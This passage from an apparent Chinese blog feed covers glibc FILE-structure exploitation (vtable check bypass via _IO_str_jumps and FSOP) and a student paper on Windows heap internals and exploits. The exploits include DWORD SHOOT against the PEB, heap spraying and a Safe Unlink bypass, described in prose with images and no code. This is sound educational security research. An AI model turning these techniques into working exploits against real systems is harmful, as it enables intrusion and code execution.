第二个检查，若能够伪造，则可以选择其他更方便的利用方法，而不用继续在<strong>vtable</strong>的利用上死磕了，因此这两个检查在正常情况下难以绕过。于是在调用<strong>_IO_vtable_check</strong>函数前的检查则成了关键，即调用的虚表指针必须在<strong><strong>start_</strong>libc_IO_vtable</strong>与<strong><strong>stop_</strong>libc_IO_vtable</strong>之间。然后大佬们就找到了这样一组内部虚表<strong>_IO_str_jumps/_IO_wstr_jumps</strong>与<strong>_IO_file_jumps/_IO_wfile_jumps</strong>相对应，但其中的函数都换成了另外一组，如下图：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-f241a48bff14704a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_str_jumps"><br>并且发现其中的<strong>__finish</strong>对应的函数大有可为，<strong>_IO_str_finish</strong>函数在<strong>glibc/libio/strops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-b407fe126bed0312.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_str_finish"><br>可以看到，当满足条件时，会将结构体中的<strong>_s._free_buffer</strong>作为函数指针，将<strong>_IO_buf_base</strong>作为参数进行执行，因此我们可以试着利用原来<strong>FSOP</strong>的利用方法，来构造一个满足条件的<strong>fake_FILE</strong>。</p><blockquote><p><strong>FSOP</strong>方法在<a href="https://www.jianshu.com/p/e1effb2e046e" target="_blank" rel="noopener">之前的文章</a>中有过介绍，在此只做简单描述。该方法的精髓为当程序从<strong>main</strong>函数返回或调用<strong>exit</strong>函数或<strong>libc</strong>进行<strong>abort</strong>操作时，会调用<strong>_IO_flush_all_lockp</strong>函数去遍历<strong>_IO_list_all</strong>链表中的每一个<strong>FILE</strong>结构体，而当<strong>FILE</strong>结构体满足<strong>(_mode &lt;= 0) &amp;&amp;  (_IO_write_ptr &gt; _IO_write_base)</strong>时，则会调用<strong>_IO_OVERFLOW</strong>函数，即<strong>vtable</strong>指针<strong>+ 0x18</strong>位置的函数。</p></blockquote><p>因此，对应到此处，想要成功调用<strong>_IO_str_finish</strong>函数，则需要在<strong>FSOP</strong>的基础上将的<strong>vtable</strong>改为<code>_IO_str_jumps - 8</code>，此为调用函数前的利用条件。在进入函数后，首先要满足判断条件<code>_IO_buf_base != NULL</code>以及<code>_flags &amp; _IO_USER_BUF == 0</code>，最后是利用条件<code>_s._free_buffer == system_addr || _IO_buf_base == &quot;/bin/sh\x00&quot;</code>或<code>_s._free_buffer == one_gadget</code>。其中<strong>_IO_strfile</strong>结构体在<strong>glibc/libio/strfile.h</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-2b6dd933c65d5997.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_strfile结构体"></p><blockquote><p>综上，我们想要需要构造如下的<strong>fake_FILE</strong>结构体来利用<strong>FSOP</strong>方法来绕过新版本中对<strong>vtable</strong>的<strong>check</strong>，从而达到利用的目的。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-ad51abda8972a8d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fake_FILE"></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows系统下典型堆漏洞产生原理及利用方法研究</title>
      <link href="/2020/03/12/Windows%E7%B3%BB%E7%BB%9F%E4%B8%8B%E5%85%B8%E5%9E%8B%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/"/>
      <url>/2020/03/12/Windows%E7%B3%BB%E7%BB%9F%E4%B8%8B%E5%85%B8%E5%9E%8B%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a><strong>写在前面</strong></h2><p>本文为本科期间想不开报名的科技创新论文，由于重视程度不够以及时间分配不合理，最终赶在<strong>deadline</strong>前完成。希望这篇能够给在这方面存在疑惑的人提供一些参考和帮助，但同时由于本人研究深度不够等因素，导致本文中存在或多或少与实际情况不符的结论，希望大家提高甄别能力。</p><a id="more"></a><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>随着时代的进步和科技的发展，在计算机的操作性能都急速发展的今天，人们对个人计算机的需求逐渐从可操作性向安全性进行转变。尤其是近年来个人计算机内存漏洞的频频披露，严重危害到用户的个人信息安全的事件频发更是加速了思想转变的进程。Windows操作系统作为个人电脑的主流操作系统，肩负着对用户个人信息负责的重任，Windows操作系统的安全性直接关乎着绝大多数人的个人信息安全。</p><p>Windows操作系统内存管理中的栈由于操作单一，已经被研究得很透彻，也被防御地很透彻，很难再掀起波澜。而堆则拥有着相对更为复杂的管理机制以及操作方式，拥有着无数耐人寻味的排列组合。</p><p>本文将通过对Windows操作系统堆的历史沿革、底层算法、实现原理进行探寻，总结归纳出各阶段Windows操作系统的堆管理机制具体实现及典型堆漏洞的产生原理及利用方法。旨在通过归纳和总结加深对Windows操作系统底层的了解，以及为对Windows操作系统堆有强烈兴趣的安全爱好者们提供一定的帮助。</p><p><strong>关键词:Windows、操作系统；安全性；堆管理机制；堆漏洞</strong></p><h1 id="ABSTRACT"><a href="#ABSTRACT" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h1><p>With the advancement of the times and the development of science and technology, as the operational performance of computers has rapidly developed, the demand for personal computers has gradually changed from operability to security. In particular, in recent years, the frequent disclosure of personal computer memory vulnerabilities has seriously jeopardized the user’s personal information security incidents, which has accelerated the process of ideological transformation. As the mainstream operating system of personal computers, the Windows operating system shoulders the responsibility of being responsible for the personal information of users. The security of the Windows operating system is directly related to the personal information security of most people.</p><p>The stack in the memory management of the Windows operating system has been thoroughly researched due to its single operation, and it has been thoroughly defended. It is difficult to make waves again. The heap has a relatively more complex management mechanism and operation mode, and has a myriad and intriguing arrangement.</p><p>This paper will explore the history of the Windows operating system heap, the underlying algorithm, and the implementation principle, and summarize the implementation of the heap management mechanism and the generation and utilization of the typical heap vulnerability in each stage of the Windows operating system. It aims to deepen the understanding of the underlying Windows operating system by summarizing and summarizing, and to provide some help to security enthusiasts who have a strong interest in the Windows operating system heap.</p><p><strong>Keywords:Windows operating system;Safety;Heap management mechani-sm;Heap vulnerability</strong></p><h1 id="一、研究背景"><a href="#一、研究背景" class="headerlink" title="一、研究背景"></a>一、研究背景</h1><p>近年来，作为操作系统主流的Windows系统漏洞层出不穷，严重威胁到了计算机使用者的信息安全。其中，缓冲区溢出漏洞作为老牌漏洞发挥着不可忽视的作用。本着对漏洞成因的好奇，笔者开始了对Windows堆缓冲区的探索。Windows内存中，堆是最为神秘、迷人甚至有些耐人寻味的地方，同时堆也是Windows内存中较为混乱的区域。由于微软对Windows操作系统中的堆管理细节并未完全公开，所以一切探索都只能靠OllyDbg、WinDbg等调试工具，及各个前辈们探索的资料的指引才能缓缓前行。</p><p>Windows操作系统经过了很多年的发展，其中堆管理机制也发生了巨大的变化，目前的堆管理机制考虑到了Windows操作系统内存有效利用、分配决策效率、安全性、健壮性等各种因素，在带来各种性能上优化的同时，这也使得Windows操作系统的堆管理机制变得异常复杂。本文选取了比较有代表性的Win32平台的堆管理机制，研究Windows操作系统堆管理机制的发展。经过研究，我们可以将Windows下堆管理机制的发展分为三个阶段，</p><ol><li><p>Windows 2000 – Windows XP SP1：这时的堆管理系统比较原始，其完全不考虑堆内存的安全性等问题，将全部精力放在任务分配和提高性能的方面。此时的堆的安全问题比较严重，比较容易被攻击。</p></li><li><p>Windows XP SP2 – Windows 2003：在吸取了上一阶段的经验后，在这一阶段，Windows将堆管理分为了前端堆管理器和后端堆管理器。同时也加入了许多安全保护措施，比如，堆块的首部格式被改变并且加入了安全验证机制，即Cookie机制，当双向链表节点在触发删除操作时，系统会对堆块的指针进行验证。这些安全保护措施使得针对堆的攻击变得非常困难，但是攻击者仍能通过一些高级的攻击手段在软件开发人员编码不规范的情况下对堆溢出实施成功利用。</p></li><li><p>Windows Vista – Windows 7：在经历了长时间的发展后，改革了前端堆管理机制，引入了新的堆管理机制以及堆块结构。使得在该阶段中，不论在分配效率还是在安全防护上，都有了里程碑式的飞跃。</p></li></ol><p>下面本文将就这三个阶段堆的环境准备、重要结构、分配机制、保护机制以及常见漏洞的成因和利用方法做出详细讲解说明。</p><h1 id="二、Windows-2000-–-Windows-XP-SP1"><a href="#二、Windows-2000-–-Windows-XP-SP1" class="headerlink" title="二、Windows 2000 – Windows XP SP1"></a>二、Windows 2000 – Windows XP SP1</h1><h2 id="2-1-环境准备"><a href="#2-1-环境准备" class="headerlink" title="2.1 环境准备"></a>2.1 环境准备</h2><p>32位Windows 2000 SP4虚拟机、OllyDbg、WinDbg。</p><h2 id="2-2-重要结构"><a href="#2-2-重要结构" class="headerlink" title="2.2 重要结构"></a>2.2 重要结构</h2><p>在该阶段，整个堆空间主要由4个结构来维护，分别是段表(segment list)、虚表(Virtual Allocation list)、空表(freelist)和快表(lookaside)。其中，与空表伴生的还有两个数据结构，分别是空表位图(Freelist Bitmap)和堆缓存(Heap Cache)，这两个数据结构的引入减少了在分配时对空表的遍历次数，加快了分配速度。</p><h3 id="2-2-1-堆块基本结构"><a href="#2-2-1-堆块基本结构" class="headerlink" title="2.2.1 堆块基本结构"></a>2.2.1 堆块基本结构</h3><p>该阶段中占用状态的堆块结构如图1所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-232f2dadb8d72e59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图1 占用状态的堆块结构"></p><p>该阶段中空闲状态的堆块结构如图2所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-1568135a97439e80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图2 空闲状态的堆块结构"></p><h3 id="2-2-2-空表"><a href="#2-2-2-空表" class="headerlink" title="2.2.2 空表"></a>2.2.2 空表</h3><p>在堆的分配过程中，我们主要关心管理空闲堆块的空表与快表的分配规则。空表共有128个双向链表，每一条双向链表为一条空表，除第0号、1号空表外，从第2号空表到127号空表分别维护着从16字节(含堆头)开始到1016字节(含堆头)每8字节递增的空表，即(空表号*8字节)大小。由于空闲状态的堆头信息占8字节，因此1号空表始终不会有堆块链入。进入空表的堆块遵从先进后出(FILO)的规律。而0号空表则维护着按大小升序排列的，所有大于1016字节的小块和大块(&lt;512KB)。空表结构如图3所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-0252df55ef4c60c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图3 空表索引区"></p><h3 id="2-2-3-空表位图"><a href="#2-2-3-空表位图" class="headerlink" title="2.2.3 空表位图"></a>2.2.3 空表位图</h3><p>空表位图大小为128bit，每一bit都对应着相应一条空表。若该对应的空表中没有链入任何空闲堆块，则对应的空表位图中的bit就为0，反之为1。在从对应大小空表分配内存失败后，系统将尝试从空表位图中查找满足分配大小且存在空闲堆块的最近的空表，从而加速了对空表的遍历。</p><h3 id="2-2-4-堆缓存"><a href="#2-2-4-堆缓存" class="headerlink" title="2.2.4 堆缓存"></a>2.2.4 堆缓存</h3><p>堆缓存是一个包含有896个指针的数组，数组中的指针为NULL指向0号空表中1024-8192字节的空闲堆块。数组中的每个元素都对应着0号空表中大小为(1K+8字节*其索引号)的空闲堆块，若0号空表中存在与其大小匹配的空闲堆块，则堆缓存数组中对应的元素为指向该空闲堆块的指针，若无，则对应元素为NULL。堆缓存数组中的最后一个元素较为特殊，该元素并不会仅指向大小为8192字节的空闲堆块，而是指向0号空表中第一个大于等于8192字节的空闲堆块。为加快对堆缓存的遍历，又引入了堆缓存位图对堆缓存中的非空指针进行了标记，其作用机理与上文中的空表位图相同，在此不做过多赘述。在利用空表位图从非0号空表中分配内存失败后，系统将尝试通过堆缓存位图索引到堆缓存数组查找满足分配大小的0号空表中的空闲堆块。</p><h3 id="2-2-5-快表"><a href="#2-2-5-快表" class="headerlink" title="2.2.5 快表"></a>2.2.5 快表</h3><p>快表是与Linux系统中Fastbin相似的存在，是为加速系统对小块的分配而存在的一个数据结构。快表共有128条单向链表，每一条单链表为一条快表，除第0号、1号快表外，从第2号快表到127号快表分别维护着从16字节(含堆头)开始到1016字节(含堆头)每8字节递增的快表，即(快表号*8字节)大小。由于空闲状态的堆头信息占8字节，因此0号和1号快表始终不会有堆块链入。每条快表最多有4个结点，进入快表的堆块遵从先进后出(FILO)的规律。为提升小堆块的分配速度，在快表中的空闲堆块不会进行合并操作。快表索引区结构如图4所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-607b083c393ab2d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图4 空表索引区"></p><h2 id="2-3-堆块操作"><a href="#2-3-堆块操作" class="headerlink" title="2.3 堆块操作"></a>2.3 堆块操作</h2><p>在内存中，堆块按大小分为3种，分别为小块(&lt;1KB)、大块(&lt;512KB)和巨块(≥512KB)，堆块间主要存在3中操作方式，分别是堆块的分配、堆块的释放、堆块的合并。</p><h3 id="2-3-1-堆块分配"><a href="#2-3-1-堆块分配" class="headerlink" title="2.3.1 堆块分配"></a>2.3.1 堆块分配</h3><p>堆块在进行分配时，主要会从上文提到的快表和空表中进行分配。</p><p>从快表进行堆块分配时，首先会通过用户申请堆块大小索引到维护对应大小的快表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将快表头指向后项空闲堆块。</p><p>从空表进行堆块分配时，首先会找到维护对应大小的空表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将空表头的后项指针指向被卸下的堆块的后项堆块。若对应大小的空表内分配失败，则会寻找次优项，在下一个空表中进行分配，直到寻找到能够满足内存分配的最小内存的空闲堆块。当在空表中寻找次优项成功时，会进行切割分配，即从找到的较大堆块中切割下申请大小的堆块分配给程序使用，并将切割剩余的部分按大小加上堆头链入对应的空表。若将所有除0号空表外的所有空表都遍历完仍然没有分配成功，则判断0号空表中的最后一个堆块大小是否大于所需分配内存大小，若大于则从0号空表中正向查找满足分配大小的最小堆块进行分配。</p><p>在用户申请分配某一大小的内存空间时，系统会首先判断申请的堆块是否属于巨块范畴，若是巨块，则采用虚分配，在漏洞利用中遇到较少，本文不予讨论。若申请大块，则首先考虑堆缓存进行分配，若分配不成功，则从0号空表中寻找最合适的空闲块进行分配。若申请小块，则首先查看对应大小的快表中有没有空闲的堆块，若无则查看对应大小的空表中有没有空闲的堆块，若无则通过空表位图查找更大的空表中有没有空闲的堆块进行切割分配，若无则采用堆缓存进行分配，若分配失败，则从0号空表中寻找最适合的空闲快进行分配，若依然失败，则会先进行内存紧缩后再尝试分配。堆块分配流程如图5所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-28bbeb608bf4aea6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图5 堆块分配流程"></p><h3 id="2-3-2-堆块释放"><a href="#2-3-2-堆块释放" class="headerlink" title="2.3.2 堆块释放"></a>2.3.2 堆块释放</h3><p>堆块释放，即将堆块从占用状态更改为空闲状态。在准备释放某一大小的内存空间时，首先会判断释放释放的堆块是否属于巨块范畴，若是巨块，则直接将该空间释放，不会进入任何堆表。若是大块，则尝试将其释放入堆缓存，若堆缓存已满，则链入0号空表。若是小块，则首先尝试链入对应大小的快表，若链入快表，为了加快堆块的分配，系统不会更改其占用状态。若对应大小的快表中已经链满了4个空闲堆块，则将该堆块链入对应大小的空表中。</p><h3 id="2-3-3-堆块合并"><a href="#2-3-3-堆块合并" class="headerlink" title="2.3.3 堆块合并"></a>2.3.3 堆块合并</h3><p>在进行堆块释放时，若释放堆块直接进入空表(链接在快表中的空闲堆块不会进行合并操作)，并且与该堆块物理地址相邻的堆块同为空闲态，则会进行堆块的合并。在进行堆块合并时，会将堆块从空表中卸下，将两个相邻的内存空间整合后更新新空闲堆块的堆头信息，并根据新空闲堆块的大小链入相应大小的空表中。除了堆块的释放会触发堆块合并外，在申请堆块时，若未成功从快表、堆缓存及空表中分配空间，则会触发内存紧缩。内存紧缩会将堆空间中的所有空闲堆块，无论地址是否连续，都整合成一个大的空闲堆块再进行堆块分配。</p><h2 id="2-4-保护机制"><a href="#2-4-保护机制" class="headerlink" title="2.4 保护机制"></a>2.4 保护机制</h2><p>微软对于Windows系统的内存保护机制是从Windows XP SP2版本才开始有明显建树的，在Windows 2000 – Windows XP SP1版本这一阶段，微软仅考虑了操作系统的性能和功能完整性，并没有过多考虑安全性因素，也正是由于这点，导致在该阶段系统中存在的漏洞极易被利用。</p><h2 id="2-5-漏洞利用"><a href="#2-5-漏洞利用" class="headerlink" title="2.5 漏洞利用"></a>2.5 漏洞利用</h2><p>如上文所说，该阶段为Windows系统原生阶段，只考虑了系统的性能和功能完整性，并没有过多的考虑安全性因素。因此在该阶段的堆漏洞的利用方法是最多样、最自由也是最稳定的，如DWORD SHOOT、Heap Spray等。接下来将详细介绍在该阶段操作系统中比较经典和常见的漏洞的产生原因以及利用方式。</p><h3 id="2-5-1-DWORD-SHOOT"><a href="#2-5-1-DWORD-SHOOT" class="headerlink" title="2.5.1 DWORD SHOOT"></a>2.5.1 DWORD SHOOT</h3><h4 id="2-5-1-1-漏洞成因"><a href="#2-5-1-1-漏洞成因" class="headerlink" title="2.5.1.1 漏洞成因"></a>2.5.1.1 漏洞成因</h4><p>该漏洞产生的主要原因是空表在将堆块进行Unlink操作时，未对堆块前项指针和后项指针的合法性进行安全检测，在对其赋值时产生的漏洞，Unlink算法伪代码如图6所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-3ffdfd01d16bea65.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图6 Unlink算法"></p><p>由于可以达到对任意地址写4字节数据的效果，因此被命名为DWORD SHOOT。也是为了防止攻击者对该漏洞的利用，Windows在下一阶段的版本中更新了Safe Unlink机制，对将要Unlink堆块的前项指针及后项指针的合法性进行安全检测。</p><h4 id="2-5-1-2-利用方式"><a href="#2-5-1-2-利用方式" class="headerlink" title="2.5.1.2 利用方式"></a>2.5.1.2 利用方式</h4><p>在堆溢出的基础上，修改相邻堆块堆头中的前项指针和后项指针，之后在对被修改后的堆块进行Unlink操作时，由于不会检测前项指针及后项指针的合法性，按照Unlink算法的逻辑会将Flink的数据写到Blink指向地址字节的位置，即可实现任意地址写4字节可控数据的操作。在得到任意地址写4字节的机会后，可以有各式各样的利用方式，比如将敏感函数的地址写到另一个函数的跳转地址或虚表上，再引导程序流去触发该跳转达到利用目的，当然该敏感函数的地址也可以为提前布置好的shellcode起始地址。接下来举一个较为常见的利用DWORD SHOOT漏洞的方法。</p><p>该方法通过篡改P.E.B中的函数指针为shellcode起始地址实现恶意代码的执行。P.E.B结构中存放的RtlEnterCriticalSection()和RtlLeaveCriticalSection()函数指针是一个比较理想的攻击地址。在程序正常退出时会调用ExitProcess()，为了同步线程该函数又会调用RtlEnterCriticalSection()及RtlLeaceCriticalSection()进行处理。除此之外，在此阶段的Windows系统中P.E.B结构拥有着固定的地址为0x7FFDF000，向下偏移0x20位RtlEnterCriticalSection()的函数指针，即地址为0x7FFDF020，紧接着0x7FFDF024的地址存放着RtlLeaveCriticalSection()的函数指针。由于以上原因，导致在该阶段的操作系统中，P.E.B结构成了DWORD SHOOT等任意地址写漏洞利用方法的绝佳狙击点。为防止攻击者有机可乘，Windows在下一阶段的版本中更新了P.E.B Random机制，将P.E.B结构的地址进行了随机化。</p><p>了解该漏洞利用方式的原理后，我们将堆块的后项指针篡改为0x7FFDF020，将前项指针篡改为提前布置好的shellcode的起始地址，在将该堆块从空表中申请回来时触发Unlink操作就完成了漏洞的利用，导致shellcode中代码的执行。</p><p>除了狙击P.E.B结构外，该漏洞还常常攻击Windows异常处理机制中的S.E.H结构、V.E.H结构、U.E.F结构等，由于上述结构在内存中都有固定地址，利用方法与刚刚提到的P.E.B结构相同，因此不再一一赘述。</p><h3 id="2-5-2-Heap-Spray"><a href="#2-5-2-Heap-Spray" class="headerlink" title="2.5.2 Heap Spray"></a>2.5.2 Heap Spray</h3><h4 id="2-5-2-1-漏洞成因"><a href="#2-5-2-1-漏洞成因" class="headerlink" title="2.5.2.1 漏洞成因"></a>2.5.2.1 漏洞成因</h4><p>Heap Spray，又称堆喷，与典型能够实施精准攻击的堆漏洞不同，堆喷是一种比较暴力且相对不稳定的攻击手法，并且该手法常常被用来针对浏览器。其产生的原因主要是应用程序在堆分配空间时没有过多的约束，使得攻击者能够多次申请堆块占据大部分内存，再通过地毯式的覆盖，最终劫持程序控制流导致恶意代码被执行。</p><p>在栈溢出的利用方式中，劫持程序控制流后往往会将EIP修改为shellcode布置的地址，而为了提高shellcode成功执行的几率，往往会在前方加一小段不影响shellcode执行的滑梯指令（slide code），常用的滑梯指令有nop指令(0x90)及or al指令(0x0c0c)。而随着操作系统安全性的提升，尤其是地址随机化的诞生，使得普通的溢出漏洞难以再掀起波澜。于是研究者们发明了堆喷这一种攻击手法作为辅助攻击的方式。</p><h4 id="2-5-2-2-利用方式"><a href="#2-5-2-2-利用方式" class="headerlink" title="2.5.2.2 利用方式"></a>2.5.2.2 利用方式</h4><p>该攻击手法的前提条件为已经可以修改EIP寄存器的值为0x0c0c0c0c。每次申请1M的内存空间，利用多个0x0c指令与shellcode相结合用来填充该空间，一般来说shellcode只占几十字节，相对的滑梯指令占了接近1M，导致滑梯指令的大小远远大于shellcode大小。通过多次申请1M的空间来将进程空间中的0x0c0c0c0c地址覆盖。因为有远大于shellcode的滑梯指令的存在，该地址上的值有99%以上的几率被覆盖为0x0c0c0c0c，从而执行到shellcode。由于堆分配是从低地址向高地址分配，因此一般申请200M(0x0c800000)的堆块就能够覆盖到0x0c0c0c0c的地址。</p><p>该利用方式中之所以不采用0x90作为滑梯指令，主要是因为内存空间中存放了许多对象的虚函数指针，当将这些虚函数指针覆盖到0x90909090后，在调用该函数就会导致程序崩溃，该阶段操作系统分配给用户使用的内存为前2G，即0x00000000 - 0x7FFFFFFF，其中进程仅能访问0x00010000 – 0x7FFEFFFF，从0x80000000 – 0xffffffff的后2G内存被设计来只有内核能够访问。而覆盖为0x0c0c0c0c时，0x0c0c0c0c地址有很大几率已经被我们用滑梯指令所覆盖，从而直接执行shellcode。因此，若虚函数指针被覆盖为0x90909090为内核空间，不能被进程所访问，采用0x0c作为滑梯指令一举两得。</p><p>该利用方式由于会很暴力地申请多次内存，并将构造好的大量滑梯指令及小部分的shellcode像井喷一样“喷”满内存各处，因此又被很形象地命名为“堆喷”。</p><h1 id="三、-Windows-XP-SP2-–-Windows-2003"><a href="#三、-Windows-XP-SP2-–-Windows-2003" class="headerlink" title="三、 Windows XP SP2 – Windows 2003"></a>三、 Windows XP SP2 – Windows 2003</h1><h2 id="3-1-环境准备"><a href="#3-1-环境准备" class="headerlink" title="3.1 环境准备"></a>3.1 环境准备</h2><p>32位Windows XP SP3虚拟机、OllyDbg、WinDbg。</p><h2 id="3-2-重要结构"><a href="#3-2-重要结构" class="headerlink" title="3.2 重要结构"></a>3.2 重要结构</h2><p>在该阶段，堆块的数据结构基本继承于Windows 2000 – Windows XP SP1阶段的数据结构。但由于增加了一些保护机制，导致了堆块的堆头的基本结构与原始结构有所差别。</p><p>该阶段中占用状态的堆块结构如图7所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-88b9052d30fae48a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图7 占用状态的堆块结构"></p><p>该阶段下空闲状态的堆块结构如图8所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-cd65e79ca30f3e50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图8 空闲状态的堆块结构"></p><h2 id="3-3-堆块操作"><a href="#3-3-堆块操作" class="headerlink" title="3.3 堆块操作"></a>3.3 堆块操作</h2><p>在该阶段，堆的分配被划分为前端堆管理器(Front-End Manager)和后端堆管理器(Back-End Manager)，其中前端堆管理器主要由上文中提到的快表有关的分配机制构成，后端堆管理器则是由空表有关的分配机制构成。除前、后端堆管理器以外的堆块分配、释放、合并等操作基本继承于Windows 2000 – Windows XP SP1阶段的堆块操作。</p><h2 id="3-4-保护机制"><a href="#3-4-保护机制" class="headerlink" title="3.4 保护机制"></a>3.4 保护机制</h2><p>从该阶段开始，微软渐渐开始重视Windows操作系统的安全性，逐步在内存中加入了许多安全保护机制，如GS、Safe S.E.H、DEP、ASLR及部分堆保护机制等。本部分将就该阶段中Windows系统中新增加的堆保护机制做出部分说明。</p><h3 id="3-4-1-Heap-Cookie"><a href="#3-4-1-Heap-Cookie" class="headerlink" title="3.4.1 Heap Cookie"></a>3.4.1 Heap Cookie</h3><p>Heap Cookie从Windows XP SP2版本开始使用，为上文提到的改变了Windows堆块结构的保护机制，该机制将堆头信息中原1字节的段索引(Segment Index)的位置新替换成了security cookie用来校验是否发生了堆溢出，相应的原1字节的标签索引(Tag Index)的位置替换为段索引位置，取消掉了标签索引。</p><p>该机制是在堆块分配时在堆头中随机生成1字节的cookie用于保护其之后的标志位(Flags)、未使用大小(Unused bytes)、段索引及前项堆块指针(Flink)、后项堆块指针(Blink)等敏感数据不被堆溢出所篡改。并在堆块被释放时检查堆头中的cookie是否被篡改，若被篡改则调用RtlpHeapReportCorruption()结束进程。值得一提的是，此函数在HeapEnableTerminateOnCorrupton字段被设置后才会起到结束进程的效果，而在该阶段的版本中该字段默认不启用，因此该函数并没有起到结束进程的作用。</p><h3 id="3-4-2-Safe-Unlink"><a href="#3-4-2-Safe-Unlink" class="headerlink" title="3.4.2 Safe Unlink"></a>3.4.2 Safe Unlink</h3><p>Safe Unlink保护机制在前一阶段版本中的Unlink算法前加上了安全检查机制。该机制在堆块从堆表中进行拆卸的操作时，对堆头前项指针和后项指针的合法性进行了检查，解决了之前版本中可通过篡改堆头的前项指针和后项指针轻易执行恶意代码的安全隐患。Safe Unlink算法伪代码如图9所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-daec8ab6a78e135d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图9 Safe Unlink算法"></p><h3 id="3-4-3-PEB-Random"><a href="#3-4-3-PEB-Random" class="headerlink" title="3.4.3 PEB Random"></a>3.4.3 PEB Random</h3><p>P.E.B结构(Process Envirorment Block Structure)中包含了进程的信息。该机制将在老版本Windows中固定为0x7FFDF000的P.E.B结构地址进行了随机化，解决了之前版本中能轻易对固定地址的P.E.B结构中函数指针进行非法操作，从而执行恶意代码的安全隐患。</p><h2 id="3-5-漏洞利用"><a href="#3-5-漏洞利用" class="headerlink" title="3.5 漏洞利用"></a>3.5 漏洞利用</h2><p>如上文所说，该阶段的版本只是在前一阶段的基础上加入了一些保护机制，尽管这些保护机制的引入杜绝了前一版本中的一些常见漏洞，如空表堆块拆卸时的DWORD SHOOT，和一些通用的攻击手法，如狙击P.E.B结构中的函数指针。在常规空表利用条件日渐苛刻的环境下，安全研究人员将目光转向了快表、0号空表、堆缓存及空表位图的利用。</p><h3 id="3-5-1-Bypass-Safe-Unlink"><a href="#3-5-1-Bypass-Safe-Unlink" class="headerlink" title="3.5.1 Bypass Safe Unlink"></a>3.5.1 Bypass Safe Unlink</h3><h4 id="3-5-1-1-漏洞成因"><a href="#3-5-1-1-漏洞成因" class="headerlink" title="3.5.1.1 漏洞成因"></a>3.5.1.1 漏洞成因</h4><p>虽然在加入了Safe Unlink条件后，极大的限制了DWORD SHOOT攻击的使用场景，但随着研究人员对Safe Unlink检测机制的研究，仍然构造出了一种十分苛刻的场景达到去绕过Safe Unlink检测机制，触发漏洞最终导致任意地址写。</p><h4 id="3-5-1-2-利用方式"><a href="#3-5-1-2-利用方式" class="headerlink" title="3.5.1.2 利用方式"></a>3.5.1.2 利用方式</h4><p>按照上文Safe Unlink保护机制所述，在unlink一个堆块时，会检查该堆块后项堆块的Flink字段和该堆块前项堆块的Blink字段是否都指向该堆块，根据堆块指针和前项后项指针的偏移为0和4字节，可以将判断条件简化为如图10所示伪代码。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-ae8b5c98201360c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图10 Safe Unlink算法"></p><p>当需要unlink的堆块为该空表上的唯一一个堆块，此时会存在一个特殊情况：堆块的Flink字段等于Blink字段等于空表头结点，空表头结点的Flink字段也等于Blink字段等于堆块地址，如图11所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-0fcb91beb26f0c0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图11 Bypass Safe Unlink(1)"></p><p>若能够通过堆溢出漏洞将该堆块的Flink字段修改为Freelist[x-1].Blink，将Blink字段修改为Freelist[x].Blink，此时仍然可以通过Unlink之前的安全检测，如图12所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-adbdc259eb9a64a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图12 Bypass Safe Unlink(2)"></p><p>并且此时绕过安全检测后执行Unlink操作的结果如图13所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-727f3e8d05f118d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图13 Bypass Safe 